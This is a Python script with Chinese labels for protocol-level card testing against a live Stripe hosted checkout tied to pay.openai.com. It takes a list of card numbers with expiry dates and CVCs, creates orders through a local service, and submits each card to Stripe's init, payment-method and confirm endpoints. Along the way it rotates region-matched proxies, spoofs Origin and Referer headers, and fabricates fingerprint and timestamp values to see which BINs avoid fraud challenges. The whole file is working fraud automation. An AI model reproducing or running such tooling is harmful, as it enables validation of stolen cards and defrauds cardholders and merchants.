"""纯协议跑卡：看在同一个商户下，不同 BIN 是否会触发挑战。

不调用打码、不启动浏览器。每张卡：建单 → init → pm → confirm。
输出：掩码卡号 + 结果（挑战 / 拒卡+原因 / 其他错误）。
"""
import json
import re
import secrets
import sys
import time
import uuid
from pathlib import Path
from urllib.parse import urlencode

import httpx

sys.path.insert(0, "/opt/gss/app/packages/core/src")
from gss_core.proxies import configured_proxy, align_proxy_region

STRIPE = "https://api.stripe.com"
API = "http://127.0.0.1:18120"
ORIGIN = "https://<PAY_HOST>"
PK = ("pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlq"
      "CxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n")
V = "2020-08-27;custom_checkout_beta=v1"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
BILLING_BY_COUNTRY = {
    "US": {"line1": "1 Fixture St", "city": "Portland",
           "state": "OR", "zip": "97211", "country": "US"},
    "CA": {"line1": "88 Queen St W", "city": "Toronto",
           "state": "ON", "zip": "M5H 2M5", "country": "CA"},
    "GB": {"line1": "10 Downing St", "city": "London",
           "state": "England", "zip": "SW1A 2AA", "country": "GB"},
}
BILLING = {"name": "FIXTURE HOLDER", "email": "<BILLING_EMAIL>"}
ALPHABET = "#$&;<=>?CDLMNOPQRTUXY[\\]^_`bdenoqrstuvwxyz{"

CARDS = []
for raw in sys.stdin.read().splitlines():
    raw = raw.strip()
    if not raw or "|" not in raw:
        continue
    p = raw.split("|")
    if len(p) < 3 or not p[0].isdigit():
        continue
    num, exp, cvc = p[0], p[1], p[2]
    country = (p[6].strip() if len(p) > 6 else "") or "US"
    mm, yy = exp.split("/")
    CARDS.append({"num": num, "mm": mm.strip(), "yy": yy.strip(),
                  "cvc": cvc.strip(), "country": country.upper()})


def mask(n):
    return n[:6] + "****" + n[-4:]


def form(d):
    return urlencode([(k, str(v)) for k, v in d.items() if v is not None and v != ""])


def sid():
    return str(uuid.uuid4()) + secrets.token_hex(3)


def rv(n=212):
    return "".join(secrets.choice(ALPHABET) for _ in range(n))


auth = json.loads(Path("/opt/gss/config/container-auth.json").read_text())
ats = json.loads(Path("/opt/gss/data/at_list.json").read_text())

print(f"卡片数: {len(CARDS)}")
results = []

for idx, card in enumerate(CARDS, 1):
    tag = f"[{idx}/{len(CARDS)}] {mask(card['num'])} {card['country']}"
    try:
        proxy = align_proxy_region(configured_proxy("checkout"), card["country"])
        proxy = re.sub(r"sid-[A-Za-z0-9]+", "sid-" + secrets.token_hex(4), proxy)
        cs = ""
        with httpx.Client(base_url=API, timeout=200, follow_redirects=False) as c:
            r = c.post("/login", data={"password": auth["password"]},
                       headers={"Origin": ORIGIN})
            ck = {"Origin": ORIGIN,
                  "Cookie": "__Host-gss_session=" + (r.cookies.get("__Host-gss_session") or "")}
            r = c.post("/api/orders", headers=ck, json={
                "plan": "team", "billing_country": card["country"],
                "session": ats[int(time.time()) % len(ats)], "seat_quantity": 2,
                "workspace_name": "Team Workspace", "price_interval": "month"})
            if r.status_code != 201:
                print(f"  {tag} 建单失败 {r.status_code}")
                results.append((mask(card["num"]), card["country"], "建单失败"))
                continue
            v = c.get("/api/orders/" + r.json()["id"], headers=ck).json()
            m = re.search(r"(cs_live_[A-Za-z0-9]+)", v.get("checkout_url") or "")
            if not m:
                results.append((mask(card["num"]), card["country"], "无 cs"))
                continue
            cs = m.group(1)

        with httpx.Client(proxy=proxy, timeout=60,
                          headers={"Content-Type": "application/x-www-form-urlencoded",
                                   "User-Agent": UA}) as c:
            j = c.post(f"{STRIPE}/v1/payment_pages/{cs}/init", content=form({
                "key": PK, "_stripe_version": V, "browser_locale": "en-US",
                "browser_timezone": "America/New_York", "eid": "NA",
                "redirect_type": "url"})).json()
        amount = str((j.get("total_summary") or {}).get("due") or "5000")
        cfg = j.get("config_id", "")

        addr = BILLING_BY_COUNTRY.get(card["country"], BILLING_BY_COUNTRY["US"])
        g, mu, s2 = sid(), sid(), sid()
        H = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA,
             "Origin": "https://pay.openai.com", "Referer": "https://pay.openai.com/"}
        with httpx.Client(proxy=proxy, timeout=60, headers=H) as c:
            r = c.post(f"{STRIPE}/v1/payment_methods", content=form({
                "type": "card", "card[number]": card["num"],
                "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
                "card[cvc]": card["cvc"],
                "billing_details[name]": BILLING["name"],
                "billing_details[email]": BILLING["email"],
                "billing_details[address][country]": addr["country"],
                "billing_details[address][line1]": addr["line1"],
                "billing_details[address][city]": addr["city"],
                "billing_details[address][state]": addr["state"],
                "billing_details[address][postal_code]": addr["zip"],
                "payment_user_agent": "stripe.js/1b9d6bdd6d; stripe-js-v3/1b9d6bdd6d; checkout",
                "guid": g, "muid": mu, "sid": s2, "key": PK, "_stripe_version": V,
                "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                "client_attribution_metadata[checkout_session_id]": cs,
                "client_attribution_metadata[checkout_config_id]": cfg,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified"}))
            if r.status_code != 200:
                e = (r.json() or {}).get("error") or {}
                print(f"  {tag} pm 失败 {e.get('code')} {str(e.get('message'))[:50]}")
                results.append((mask(card["num"]), card["country"],
                                f"pm:{e.get('code')}"))
                continue
            pm = r.json()["id"]
            r = c.post(f"{STRIPE}/v1/payment_pages/{cs}/confirm", content=form({
                "eid": "NA", "payment_method": pm, "expected_amount": amount,
                "consent[terms_of_service]": "accepted",
                "expected_payment_method_type": "card",
                "_stripe_version": V, "guid": g, "muid": mu, "sid": s2, "key": PK,
                "link_brand": "link", "rv_timestamp": rv(),
                "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                "client_attribution_metadata[checkout_session_id]": cs,
                "client_attribution_metadata[checkout_config_id]": cfg,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified"}))
        cj = r.json()
        err = cj.get("error") or {}
        if err:
            code = err.get("code")
            dc = err.get("decline_code")
            print(f"  {tag} ★ 直接拒卡 {code} / {dc}")
            results.append((mask(card["num"]), card["country"], f"拒卡 {code}/{dc}"))
            continue
        pi = cj.get("payment_intent") or {}
        sdk = (pi.get("next_action") or {}).get("use_stripe_sdk") or {}
        st = sdk.get("type")
        lpe = pi.get("last_payment_error") or {}
        if st == "intent_confirmation_challenge":
            print(f"  {tag} 挑战")
            results.append((mask(card["num"]), card["country"], "挑战"))
        elif lpe.get("code"):
            print(f"  {tag} ★ 失败 {lpe.get('code')} / {lpe.get('decline_code')}")
            results.append((mask(card["num"]), card["country"],
                            f"失败 {lpe.get('code')}/{lpe.get('decline_code')}"))
        else:
            print(f"  {tag} status={pi.get('status')}")
            results.append((mask(card["num"]), card["country"], f"status={pi.get('status')}"))
    except Exception as e:
        print(f"  {tag} 异常 {str(e)[:70]}")
        results.append((mask(card["num"]), card["country"], f"异常 {str(e)[:30]}"))

print()
print("=" * 62)
print(f"{'卡号':<22}{'国家':<6}结果")
for m, ctry, res in results:
    print(f"{m:<22}{ctry:<6}{res}")
print()
tally = {}
for _, _, res in results:
    key = "挑战" if res == "挑战" else "其它"
    tally[key] = tally.get(key, 0) + 1
print("汇总:", tally)
